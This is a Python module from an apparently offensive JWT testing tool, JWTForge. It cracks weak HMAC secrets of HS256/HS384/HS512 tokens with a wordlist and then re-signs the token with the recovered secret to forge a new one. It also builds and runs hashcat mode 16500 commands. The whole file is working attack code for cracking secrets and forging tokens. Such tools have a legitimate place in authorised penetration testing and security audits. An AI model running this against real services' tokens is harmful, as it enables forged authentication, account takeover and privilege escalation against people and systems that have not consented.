"""
JWTForge - Brute Force Weak Secret Attack

HS256/HS384/HS512 tokens are signed with a shared secret.
If the secret is weak (e.g., "secret", "password", "admin"),
it can be brute-forced using a wordlist.

Also generates the hashcat command for GPU-accelerated cracking (mode 16500).

References:
  - https://hashcat.net/wiki/doku.php?id=hashcat (mode 16500 = JWT)
"""

import hmac
import hashlib
import time
import subprocess
import shutil
import os
from typing import Optional, Dict, Any, Iterator

from ..core.parser import JWTParser, b64url_encode, build_signing_input_raw


HASH_FN_MAP = {
    'HS256': hashlib.sha256,
    'HS384': hashlib.sha384,
    'HS512': hashlib.sha512,
}


def _verify_hmac(signing_input: bytes, signature_bytes: bytes, secret: bytes, alg: str) -> bool:
    """Verify a JWT HMAC signature."""
    fn = HASH_FN_MAP.get(alg.upper())
    if not fn:
        return False
    expected = hmac.new(secret, signing_input, fn).digest()
    return hmac.compare_digest(expected, signature_bytes)


def _resign_hmac(parser: JWTParser, secret: bytes, alg: str) -> str:
    """Re-sign a JWT with a known secret."""
    fn = HASH_FN_MAP[alg.upper()]
    signing_input = parser.get_signing_input()
    sig = hmac.new(secret, signing_input, fn).digest()
    return f"{parser.header_b64}.{parser.payload_b64}.{b64url_encode(sig)}"


def wordlist_iterator(path: str) -> Iterator[str]:
    """Yield words from a wordlist file, stripping whitespace."""
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            word = line.rstrip('\n\r')
            if word:
                yield word


def attack_brute_force(
    token: str,
    wordlist_path: str,
    verbose: bool = False,
    progress_cb=None,
) -> Dict[str, Any]:
    """
    Brute-force the HMAC secret for HS256/HS384/HS512 tokens.

    Args:
        token: JWT string
        wordlist_path: Path to wordlist file
        verbose: Print each attempt
        progress_cb: Optional callback(count, word) for progress updates

    Returns:
        Result dict
    """
    parser = JWTParser(token)
    alg = parser.get_algorithm().upper()

    if alg not in HASH_FN_MAP:
        return {
            'attack': 'brute_force',
            'status': 'skipped',
            'detail': f'Algorithm {alg} is not HMAC-based — cannot brute force',
        }

    if not parser.signature_bytes:
        return {
            'attack': 'brute_force',
            'status': 'error',
            'detail': 'Token has no signature to verify against',
        }

    if not os.path.isfile(wordlist_path):
        return {
            'attack': 'brute_force',
            'status': 'error',
            'detail': f'Wordlist not found: {wordlist_path}',
        }

    signing_input = parser.get_signing_input()
    sig_bytes = parser.signature_bytes

    start = time.time()
    count = 0

    try:
        for word in wordlist_iterator(wordlist_path):
            count += 1
            secret = word.encode('utf-8')

            if progress_cb and count % 1000 == 0:
                progress_cb(count, word)

            if _verify_hmac(signing_input, sig_bytes, secret, alg):
                elapsed = time.time() - start
                forged = _resign_hmac(parser, secret, alg)
                return {
                    'attack': 'brute_force',
                    'status': 'success',
                    'secret': word,
                    'token': forged,
                    'attempts': count,
                    'elapsed': elapsed,
                    'detail': f'Secret found: "{word}" after {count:,} attempts in {elapsed:.2f}s',
                    'note': f'HMAC secret is weak: "{word}"',
                }
    except FileNotFoundError:
        return {
            'attack': 'brute_force',
            'status': 'error',
            'detail': f'Could not open wordlist: {wordlist_path}',
        }

    elapsed = time.time() - start
    return {
        'attack': 'brute_force',
        'status': 'not_found',
        'attempts': count,
        'elapsed': elapsed,
        'detail': f'Secret not found — tried {count:,} passwords in {elapsed:.2f}s',
    }


def generate_hashcat_command(token: str, wordlist_path: str = 'wordlist.txt') -> Dict[str, Any]:
    """
    Generate the hashcat command for JWT cracking (mode 16500).

    Hashcat mode 16500 = JWT (HS256/HS384/HS512)
    Usage: hashcat -a 0 -m 16500 <token> <wordlist>

    Args:
        token: JWT string
        wordlist_path: Path to wordlist

    Returns:
        Dict with hashcat command and details
    """
    parser = JWTParser(token)
    alg = parser.get_algorithm().upper()

    # Hashcat requires the full JWT token in a file
    cmd = f"hashcat -a 0 -m 16500 '{token}' {wordlist_path}"
    cmd_with_rules = f"hashcat -a 0 -m 16500 '{token}' {wordlist_path} -r /usr/share/hashcat/rules/best64.rule"
    cmd_potfile = f"hashcat -a 0 -m 16500 '{token}' {wordlist_path} --show"

    hashcat_available = shutil.which('hashcat') is not None

    return {
        'available': hashcat_available,
        'mode': '16500',
        'algorithm': alg,
        'command': cmd,
        'command_with_rules': cmd_with_rules,
        'command_show': cmd_potfile,
        'note': 'Save JWT token to a file and use: hashcat -a 0 -m 16500 hash.txt wordlist.txt',
    }


def run_hashcat(token: str, wordlist_path: str, extra_args: str = '') -> Dict[str, Any]:
    """
    Actually invoke hashcat if available.

    Args:
        token: JWT token
        wordlist_path: Wordlist path
        extra_args: Extra hashcat arguments

    Returns:
        Result dict with stdout/stderr
    """
    if not shutil.which('hashcat'):
        return {
            'attack': 'hashcat',
            'status': 'error',
            'detail': 'hashcat not found in PATH. Install it: https://hashcat.net',
        }

    import tempfile
    with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as tf:
        tf.write(token + '\n')
        hash_file = tf.name

    try:
        cmd = ['hashcat', '-a', '0', '-m', '16500', hash_file, wordlist_path]
        if extra_args:
            cmd.extend(extra_args.split())

        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

        # Check for cracked result
        show_result = subprocess.run(
            ['hashcat', '-a', '0', '-m', '16500', hash_file, wordlist_path, '--show'],
            capture_output=True, text=True
        )

        cracked_line = show_result.stdout.strip()
        if cracked_line and ':' in cracked_line:
            secret = cracked_line.split(':')[-1]
            return {
                'attack': 'hashcat',
                'status': 'success',
                'secret': secret,
                'detail': f'Secret found via hashcat: "{secret}"',
            }

        return {
            'attack': 'hashcat',
            'status': 'not_found',
            'stdout': result.stdout,
            'stderr': result.stderr,
            'detail': 'hashcat completed, no secret found',
        }
    except subprocess.TimeoutExpired:
        return {'attack': 'hashcat', 'status': 'error', 'detail': 'hashcat timed out'}
    finally:
        os.unlink(hash_file)
